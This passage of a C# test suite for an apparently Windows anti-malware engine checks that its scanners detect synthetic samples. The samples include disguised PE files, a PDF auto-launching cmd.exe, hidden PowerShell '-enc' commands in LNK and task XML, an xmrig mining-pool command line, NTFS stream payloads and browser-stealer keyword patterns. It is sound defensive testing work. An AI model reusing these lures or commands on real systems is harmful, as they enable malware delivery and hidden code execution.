        var fakePng = Path.Combine(evDir, "avatar.png");
        File.WriteAllBytes(fakePng, BuildSyntheticPeBytes());
        var fakePngHit = orch.Scanner.ScanFile(fakePng, policy);
        Assert.NotNull(fakePngHit);
        Assert.True(fakePngHit!.RiskScore >= 95);
        Assert.Contains(fakePngHit.Reasons, r => r.Contains("HiddenPeExecutable"));

        // 2. PNG Steganography / Polyglot trailing PE appended after IEND vs clean PNG (0 FP!)
        var pngHeader = new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D };
        var pngIend = new byte[] { 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82 };
        var cleanPng = Path.Combine(evDir, "clean_icon.png");
        File.WriteAllBytes(cleanPng, pngHeader.Concat(pngIend).ToArray());
        Assert.Null(orch.Scanner.ScanFile(cleanPng, policy));

        var stegoPng = Path.Combine(evDir, "anime_stego.png");
        File.WriteAllBytes(stegoPng, pngHeader.Concat(pngIend).Concat(BuildSyntheticPeBytes()).ToArray());
        var stegoHit = orch.Scanner.ScanFile(stegoPng, policy);
        Assert.NotNull(stegoHit);
        Assert.True(stegoHit!.RiskScore >= 95);
        Assert.Contains(stegoHit.Reasons, r => r.Contains("Trojan.Stego.PNGEmbeddedPe"));

        // 3. Raw x64 PEB-walk shellcode blob disguised as cache.dat (decoded at runtime from +1 shifted ints)
        int[] pebShifted = { 0x91, 0x66, 0x49, 0x8C, 0x05, 0x26, 0x61, 0x01, 0x01, 0x01, 0x49, 0x8C, 0x41, 0x19, 0x91, 0x91 };
        var rawDat = Path.Combine(evDir, "cache.dat");
        File.WriteAllBytes(rawDat, pebShifted.Select(v => (byte)(v - 1)).ToArray());
        var rawDatHit = orch.Scanner.ScanFile(rawDat, policy);
        Assert.NotNull(rawDatHit);
        Assert.True(rawDatHit!.RiskScore >= 95);
        Assert.Contains(rawDatHit.Reasons, r => r.Contains("Shellcode.RawBlob.Win64PebResolver"));

        var cleanDat = Path.Combine(evDir, "normal_cache.dat");
        File.WriteAllText(cleanDat, "CACHE_V1: normal user game settings data 1234567890");
        Assert.Null(orch.Scanner.ScanFile(cleanDat, policy));

        // 4. Weaponized PDF (/OpenAction + /Launch cmd.exe) vs clean PDF (0 FP!)
        var evilPdf = Path.Combine(evDir, "invoice_exploit.pdf");
        File.WriteAllText(evilPdf, "%PDF-1.7\n1 0 obj << /OpenAction << /S /Launch /F (cmd.exe) >> >> endobj\n%%EOF");
        var pdfHit = orch.Scanner.ScanFile(evilPdf, policy);
        Assert.NotNull(pdfHit);
        Assert.True(pdfHit!.RiskScore >= 90);
        Assert.Contains(pdfHit.Reasons, r => r.Contains("Exploit.PDF.MaliciousLaunchAction"));

        var cleanPdf = Path.Combine(evDir, "clean_doc.pdf");
        File.WriteAllText(cleanPdf, "%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF");
        Assert.Null(orch.Scanner.ScanFile(cleanPdf, policy));

        // 5. NIKKE-Style Supply-Chain DLL Sideloading: unsigned version.dll planted right next to a validly signed .exe!
        var launcherDir = Path.Combine(evDir, "GameLauncherSim");
        Directory.CreateDirectory(launcherDir);
        var realSignedExe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
        var copiedSignedHost = Path.Combine(launcherDir, "GameLauncher.exe");
        File.Copy(realSignedExe, copiedSignedHost);
        var rogueVersionDll = Path.Combine(launcherDir, "version.dll");
        File.WriteAllBytes(rogueVersionDll, BuildSyntheticPeBytes());

        var sideloadHit = orch.Scanner.ScanFile(rogueVersionDll, policy);
        Assert.NotNull(sideloadHit);
        Assert.True(sideloadHit!.RiskScore >= 90);
        Assert.Contains(sideloadHit.Reasons, r => r.Contains("SupplyChain.DllSideloading.ProxyHijack"));

        // 6. Stolen-Certificate / Compromised-Vendor Signed Binary STILL caught by high-confidence YARA rules!
        var stolenCertPayload = Encoding.ASCII.GetBytes(string.Concat(
            "xm", "rig -o ", "stra", "tum+tcp://pool.invalid:3333 --", "donate-", "level=1"));
        var stolenCertHit = SignaturePatternScanner.ScanBytes(stolenCertPayload, isSigned: true, extension: ".exe", isMicrosoftSigned: false);
        Assert.True(stolenCertHit.IsMatched);
        Assert.Equal("Miner.Multi.CryptoMiner", stolenCertHit.ThreatName);

        // 7. Hidden NTFS Alternate Data Stream (notes.txt:payload.exe containing PE header) caught while :Zone.Identifier ignored!
        var hostTxt = Path.Combine(evDir, "notes.txt");
        File.WriteAllText(hostTxt, "Innocent user memo file");
        File.WriteAllText(hostTxt + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\n");
        Assert.Empty(NtfsAdsScanner.InspectFileStreams(hostTxt));

        File.WriteAllBytes(hostTxt + ":payload.exe", BuildSyntheticPeBytes());
        var adsHits = NtfsAdsScanner.InspectFileStreams(hostTxt);
        Assert.Single(adsHits);
        Assert.Equal("Trojan.NTFS.HiddenAdsExecutable", adsHits[0].ThreatName);

        // 8. End-to-end MzkDeepScanner CustomFolderScan catches fake PNG, stego PNG, shellcode DAT, weaponized PDF & sideloaded DLL!
        var folderRes = await orch.MzkScanner.RunScanAsync(
            MalwareScanMode.CustomFolderScan,
            policy,
            customTargetPath: evDir,
            includeDefenderCrossCheck: false);
        Assert.Contains(folderRes.Findings, f => f.TargetPath.Equals(fakePng, StringComparison.OrdinalIgnoreCase));
        Assert.Contains(folderRes.Findings, f => f.TargetPath.Equals(stegoPng, StringComparison.OrdinalIgnoreCase));
        Assert.Contains(folderRes.Findings, f => f.TargetPath.Equals(rawDat, StringComparison.OrdinalIgnoreCase));
        Assert.Contains(folderRes.Findings, f => f.TargetPath.Equals(evilPdf, StringComparison.OrdinalIgnoreCase));
        Assert.Contains(folderRes.Findings, f => f.TargetPath.Equals(rogueVersionDll, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(folderRes.Findings, f => f.TargetPath.Equals(cleanPng, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(folderRes.Findings, f => f.TargetPath.Equals(cleanPdf, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(folderRes.Findings, f => f.TargetPath.Equals(cleanDat, StringComparison.OrdinalIgnoreCase));

        // 9. Strict C2 vs Adware/Telemetry domain separation: Microsoft default.exp-tas.com & StevenBlack adware NEVER trigger ETW DNS C2 freeze!
        var sepDir = Path.Combine(evDir, "domain_sep");
        Directory.CreateDirectory(sepDir);
        File.WriteAllLines(Path.Combine(sepDir, "feed_domains.txt"), new[] { "default.exp-tas.com", "promo.adware-tracker.invalid" });
        var sepIntel = new ThreatIntelStore(sepDir);
        sepIntel.AddBlockedDomain("c2.confirmed-malware.invalid");
        Assert.False(sepIntel.IsDomainBlocked("default.exp-tas.com"));          // Protected MS experimentation telemetry!
        Assert.False(sepIntel.IsAdwareOrMalwareDomain("default.exp-tas.com"));  // Also protected from accidental browser FP!
        Assert.False(sepIntel.IsDomainBlocked("promo.adware-tracker.invalid")); // Adware list NEVER freezes processes via ETW DNS!
        Assert.True(sepIntel.IsAdwareOrMalwareDomain("promo.adware-tracker.invalid")); // Still caught by Browser hijack cleaner!
        Assert.True(sepIntel.IsDomainBlocked("c2.confirmed-malware.invalid"));  // Confirmed C2 still blocked in real-time ETW DNS!
    }

    [Fact]
    public async Task ComprehensiveCodeReview_VerifiesCatalogSig_CdnScrub_OddLnk_TaskArgs_AdsCure_And_ZeroSelfFp()
    {
        var revDir = Path.Combine(_tempRoot, "code_review_reg");
        Directory.CreateDirectory(revDir);

        // 1. Real Win32 Catalog signature verification (explorer.exe & notepad.exe verified as TrustedMicrosoft)
        var verifier = new SignatureVerifier();
        var explorerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
        var explorerSig = verifier.VerifyFile(explorerPath);
        Assert.Equal(SignatureStatus.TrustedMicrosoft, explorerSig.Status);

        // 2. Major CDN/Cloud Anycast IPs (Cloudflare, Azure/FrontDoor, Akamai) are scrubbed on Load() & never block apps
        var poisonedIntelPath = Path.Combine(revDir, "intel.json");
        File.WriteAllText(poisonedIntelPath, """
        {
          "BlockedSha256Hashes": [],
          "BlockedIpAddresses": [],
          "BlockedDomains": [],
          "FeedBlockedIpAddresses": ["104.28.1.1", "20.42.65.92", "13.107.42.14", "23.32.1.1", "198.51.100.55"],
          "FeedBlockedDomains": []
        }
        """);
        var intel = new ThreatIntelStore(revDir);
        Assert.False(intel.IsIpBlocked("104.28.1.1"));   // Cloudflare Anycast scrubbed
        Assert.False(intel.IsIpBlocked("20.42.65.92"));  // Microsoft Azure scrubbed
        Assert.False(intel.IsIpBlocked("13.107.42.14")); // Microsoft FrontDoor scrubbed
        Assert.False(intel.IsIpBlocked("23.32.1.1"));    // Akamai scrubbed
        Assert.True(intel.IsIpBlocked("198.51.100.55")); // Real C2 IP preserved

        // 3. Odd-byte-offset UTF-16LE .LNK payload caught by LnkAndContainerAnalyzer
        var oddLnk = new byte[77]; // Intentionally odd offset (parity = 1)
        oddLnk[0] = 0x4C;
        var oddLnkBytes = oddLnk.Concat(Encoding.Unicode.GetBytes("powershell.exe -w hidden -enc SQBFAFgA")).ToArray();
        var oddLnkRes = LnkAndContainerAnalyzer.AnalyzeLnkBytes(oddLnkBytes, oddLnkBytes.Length, "report.pdf.lnk");
        Assert.True(oddLnkRes.IsMaliciousOrSuspicious);
        Assert.True(oddLnkRes.RiskScore >= 85);

        // 4. Scheduled Task XML extracts BOTH <Command> and <Arguments>
        var taskXml = Path.Combine(revDir, "EvilTask.xml");
        File.WriteAllText(taskXml, "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc AAAA</Arguments></Exec></Actions></Task>");
        var taskCmd = PersistenceMonitor.TryExtractTaskXmlCommand(taskXml);
        Assert.Contains("powershell.exe", taskCmd, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("-w hidden -enc AAAA", taskCmd, StringComparison.OrdinalIgnoreCase);

        // 5. ZipArchiveAnalyzer catches EICAR inside .zip without extracting to disk
        static byte[] BuildEicarVector()
        {
            static string Rev(string s) => new(s.Reverse().ToArray());
            return Encoding.ASCII.GetBytes(
                Rev("$}7)CC7)^P(45XZP\\4[PA@%P!O5X") +
                Rev("-DRADNATS-RACIE") +
                Rev("*H+H$!ELIF-TSET-SURIVITNA"));
        }
        var eicarZipPath = Path.Combine(revDir, "eicar_bundle.zip");
        using (var zip = System.IO.Compression.ZipFile.Open(eicarZipPath, System.IO.Compression.ZipArchiveMode.Create))
        {
            var e = zip.CreateEntry("eicar.txt");
            using var s = e.Open();
            var vec = BuildEicarVector();
            s.Write(vec, 0, vec.Length);
        }
        var zipRes = ZipArchiveAnalyzer.AnalyzeZipFile(eicarZipPath, GuardPolicy.CreateDefault());
        Assert.True(zipRes.IsMaliciousOrSuspicious);
        Assert.Equal(100, zipRes.RiskScore);

        // 6. Password-protected OOXML (.docx with OLE2 D0 CF 11 E0 header) does NOT false-trigger ransomware entropy check
        var protectedDocx = RandomNumberGenerator.GetBytes(8192);
        protectedDocx[0] = 0xD0; protectedDocx[1] = 0xCF; protectedDocx[2] = 0x11; protectedDocx[3] = 0xE0;
        Assert.False(EntropyAnalyzer.AnalyzeBytes(protectedDocx, ".docx").IsLikelyEncrypted);

        // 7. Surgical NTFS ADS removal deletes ONLY hidden stream while preserving host document 100%
        var hostDoc = Path.Combine(revDir, "memo_preserve.txt");
        File.WriteAllText(hostDoc, "IMPORTANT_USER_MEMO_MUST_SURVIVE");
        var peStub = new byte[256];
        peStub[0] = 0x4D; peStub[1] = 0x5A; peStub[0x3C] = 0x80;
        peStub[0x80] = 0x50; peStub[0x81] = 0x45;
        File.WriteAllBytes(hostDoc + ":dropper.exe", peStub);

        var adsHits = NtfsAdsScanner.InspectFileStreams(hostDoc);
        Assert.Single(adsHits);
        Assert.Equal(RemediationActionType.RemoveAlternateDataStream, adsHits[0].ActionType);
        Assert.True(adsHits[0].RecommendedForCure);

        var store = new PolicyStore(revDir);
        using var orch = new SecurityOrchestrator(store);
        var adsCure = await orch.Remediation.CureSelectedAsync(adsHits);
        Assert.Equal(1, adsCure.Succeeded);
        Assert.True(File.Exists(hostDoc));
        Assert.Equal("IMPORTANT_USER_MEMO_MUST_SURVIVE", File.ReadAllText(hostDoc));
        Assert.Empty(NtfsAdsScanner.InspectFileStreams(hostDoc));

        // 8. Zero Self-Detection: AegisSentinel.Core.dll scanned by ThreatScanner produces ZERO false positives
        var coreDllPath = typeof(SecurityOrchestrator).Assembly.Location;
        Assert.True(File.Exists(coreDllPath));
        var selfScan = orch.Scanner.ScanFile(coreDllPath, orch.CurrentPolicy, includeClean: false);
        Assert.Null(selfScan);

        // 9. Signed browser/password-manager binary without webhook token does NOT false-trigger BrowserStealer YARA
        var signedImporterBytes = Encoding.ASCII.GetBytes(string.Concat(
            "Login ", "Data ", "Local ", "State ", "CryptUn", "protectData ", "os_", "crypt ", "encrypted_", "key"));
        var signedImporterRes = SignaturePatternScanner.ScanBytes(signedImporterBytes, isSigned: true, ".dll", isMicrosoftSigned: false);
        Assert.False(signedImporterRes.IsMatched);
    }

    [Fact]
    public void PeerReviewFixes_QuarantineDisposition_PartialTreeFreeze_DynamicExfilExpiry_And_AtomicDedup()
    {
        var prDir = Path.Combine(_tempRoot, "peer_review_fixes");
        Directory.CreateDirectory(prDir);

        // 1. Quarantine copy-only (original delete failed + reboot-delete scheduling failed) MUST NOT claim Quarantined!
        var lockedFile = Path.Combine(prDir, "locked_malware.exe");
        File.WriteAllBytes(lockedFile, new byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x11, 0x22 });
        var copyOnlyQm = new QuarantineManager(
            prDir,
            deleteFileOverride: _ => false,
            scheduleRebootDeleteOverride: _ => false);
        var copyStore = new PolicyStore(prDir);
        using var copyOrch = new SecurityOrchestrator(copyStore, quarantineManager: copyOnlyQm);

        var copyEvt = new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.StaticMalware,
            Severity = ThreatSeverity.Critical,
            TargetPath = lockedFile,
            Title = "Locked Malware Copy-Only Test"
        };
        bool copyOk = copyOrch.KillAndQuarantine(copyEvt);
        Assert.False(copyOk);
        Assert.Equal(QuarantineDisposition.CopyOnlyOriginalLocked, copyEvt.QuarantineDisposition);
        Assert.Equal(SecurityActionTaken.QuarantineCopyOnly, copyEvt.ActionTaken);
        Assert.True(File.Exists(lockedFile), "Original locked file remains on disk as simulated");

        // Reboot-scheduled deletion reports QuarantinePendingReboot distinctly from immediate removal
        var rebootQm = new QuarantineManager(
            prDir,
            deleteFileOverride: _ => false,
            scheduleRebootDeleteOverride: _ => true);
        using var rebootOrch = new SecurityOrchestrator(copyStore, quarantineManager: rebootQm);
        var rebootEvt = new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.StaticMalware,
            Severity = ThreatSeverity.Critical,
            TargetPath = lockedFile,
            Title = "Locked Malware Reboot-Scheduled Test"
        };
        bool rebootOk = rebootOrch.KillAndQuarantine(rebootEvt);
        Assert.True(rebootOk);
        Assert.Equal(QuarantineDisposition.ScheduledDeleteOnReboot, rebootEvt.QuarantineDisposition);
        Assert.Equal(SecurityActionTaken.QuarantinePendingReboot, rebootEvt.ActionTaken);

        // 2. Partial process-tree freeze: root fails (77100), child1 succeeds (77101), child2 fails (77102).
        //    Root event MUST NOT claim IsProcessSuspended=true, and unfrozen child2 MUST NOT be blinded in _activeInterventionPids!
        var partialProcCtrl = new ProcessController(suspendPidOverride: pid => pid == 77101);
        using var partialOrch = new SecurityOrchestrator(copyStore, processController: partialProcCtrl);
        partialOrch.TreeTracker.RecordStart(77100, 1000, "parent_mal", @"C:\Temp\parent_mal.exe", "");
        partialOrch.TreeTracker.RecordStart(77101, 77100, "child_frozen", @"C:\Temp\child_frozen.exe", "");
        partialOrch.TreeTracker.RecordStart(77102, 77100, "child_alive", @"C:\Temp\child_alive.exe", "");

        var recordedPartial = new List<SecurityEvent>();
        partialOrch.EventRecorded += e => recordedPartial.Add(e);

        var parentEvt = new SecurityEvent
        {
            ProcessId = 77100,
            ProcessName = "parent_mal",
            ProcessPath = @"C:\Temp\parent_mal.exe",
            Category = ThreatCategory.Ransomware,
            Severity = ThreatSeverity.Critical,
            RiskScore = 95,
            Title = "Partial Freeze Root Threat"
        };
        partialOrch.ProcessSecurityEvent(parentEvt);

        Assert.False(parentEvt.IsProcessSuspended);
        Assert.Equal(SecurityActionTaken.Logged, parentEvt.ActionTaken);
        Assert.Equal(2, parentEvt.AttemptedChildFreezeCount);
        Assert.Single(parentEvt.SuspendedChildProcessIds);
        Assert.Equal(77101, parentEvt.SuspendedChildProcessIds[0]);
        Assert.Contains("1/2", parentEvt.ContainmentDetail);

        // Frozen child 77101 is suppressed while awaiting intervention, but STILL-RUNNING child 77102 is NOT suppressed!
        int countBeforeChildFollowups = recordedPartial.Count;
        partialOrch.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 77101,
            ProcessName = "child_frozen",
            ProcessPath = @"C:\Temp\child_frozen.exe",
            Category = ThreatCategory.NetworkAnomaly,
            Severity = ThreatSeverity.High,
            RiskScore = 80,
            Title = "Followup From Frozen Child"
        });
        Assert.Equal(countBeforeChildFollowups, recordedPartial.Count);

        partialOrch.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 77102,
            ProcessName = "child_alive",
            ProcessPath = @"C:\Temp\child_alive.exe",
            Category = ThreatCategory.NetworkAnomaly,
            Severity = ThreatSeverity.High,
            RiskScore = 80,
            Title = "Followup From Still-Running Child"
        });
        Assert.Equal(countBeforeChildFollowups + 1, recordedPartial.Count);

        // 3. Dynamic CredentialExfiltrationChain (+45) bonus MUST expire immediately when either underlying evidence expires!
        var risk = new BehaviorRiskEngine();
        var t0 = new DateTimeOffset(2026, 11, 26, 12, 0, 0, TimeSpan.Zero);
        var at0 = risk.RecordSignal(88001, "BrowserCredRead", 35, marksCredentialAccess: true, nowOverride: t0);
        Assert.False(at0.IsExfiltrationChain);
        Assert.Equal(35, at0.TotalScore);

        var at9 = risk.RecordSignal(88001, "ExternalHttps", 25, marksExternalNetwork: true, nowOverride: t0.AddMinutes(9));
        Assert.True(at9.IsExfiltrationChain);
        Assert.Equal(100, at9.TotalScore); // 35 + 25 + 45 = 105 -> clamped 100
        Assert.Contains(at9.Signals, s => s.StartsWith("CredentialExfiltrationChain(", StringComparison.Ordinal));

        // At t=11 min: t=0 credential access expired (>10m), so bonus MUST disappear alongside IsExfiltrationChain=false!
        var at11 = risk.RecordSignal(88001, "MinorActivity", 10, nowOverride: t0.AddMinutes(11));
        Assert.False(at11.IsExfiltrationChain);
        Assert.DoesNotContain(at11.Signals, s => s.StartsWith("CredentialExfiltrationChain", StringComparison.Ordinal));
        Assert.Equal(35, at11.TotalScore); // 25 (at t=9) + 10 (at t=11) = 35, zero ghost +45 bonus!
        Assert.Equal(35, risk.GetCurrentScore(88001, nowOverride: t0.AddMinutes(11)));
        var assessed11 = risk.GetCurrentAssessment(88001, 0, Array.Empty<string>(), nowOverride: t0.AddMinutes(11));
        Assert.False(assessed11.IsExfiltrationChain);
        Assert.Equal(35, assessed11.TotalScore);

        // 4. Atomic concurrent deduplication: 16 simultaneous identical events record strictly ONCE,
        //    and a higher-risk escalation on the same key within 5s is still admitted!
        var dedupDir = Path.Combine(prDir, "dedup_test");
        Directory.CreateDirectory(dedupDir);
        var dedupStore = new PolicyStore(dedupDir);
        using var dedupOrch = new SecurityOrchestrator(dedupStore);
        int recordedCount = 0;
        dedupOrch.EventRecorded += _ => Interlocked.Increment(ref recordedCount);

        Parallel.For(0, 16, _ =>
        {
            dedupOrch.ProcessSecurityEvent(new SecurityEvent
            {
                ProcessId = 0,
                Category = ThreatCategory.NetworkAnomaly,
                Severity = ThreatSeverity.Medium,
                RiskScore = 40,
                TargetPath = @"C:\Temp\dup_test.exe",
                RemoteEndpoint = "198.51.100.10:443",
                Title = "Concurrent Identical Event"
            });
        });
        Assert.Equal(1, Volatile.Read(ref recordedCount));

        // Escalated risk score on the exact same key within 5s is admitted rather than silently dropped
        dedupOrch.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.NetworkAnomaly,
            Severity = ThreatSeverity.Critical,
            RiskScore = 90,
            TargetPath = @"C:\Temp\dup_test.exe",
            RemoteEndpoint = "198.51.100.10:443",
            Title = "Concurrent Identical Event"
        });
        Assert.Equal(2, Volatile.Read(ref recordedCount));
    }
}
